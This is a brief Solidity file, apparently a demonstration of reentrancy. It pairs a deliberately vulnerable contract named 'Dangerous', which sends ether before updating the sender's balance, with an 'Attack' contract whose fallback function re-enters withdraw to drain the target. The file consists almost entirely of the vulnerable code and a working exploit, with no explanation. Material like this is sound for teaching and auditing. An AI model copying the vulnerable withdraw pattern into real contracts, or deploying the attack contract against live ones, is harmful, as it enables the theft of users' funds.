pragma solidity ^0.4.24;
contract Dangerous {
    mapping(address => uint) deposits;
    function depositMoney() public payable {
        deposits[msg.sender] += msg.value;
    }
    function withdraw(uint amount) public {
        require(deposits[msg.sender] >= amount);
        if (!msg.sender.call.value(amount)()) {
            revert();
        }
        deposits[msg.sender] -= amount;
    }
}

contract Attack {
    Dangerous public target;
    constructor(address _target) {
        target = Dangerous(_target);
    }
    function attack() public payable {
        target.depositMoney.value(msg.value)();
        target.withdraw(msg.value);
    }
    function () payable {
        if(address(target).balance >= msg.value){
            target.withdraw(msg.value);
        }
    }
}
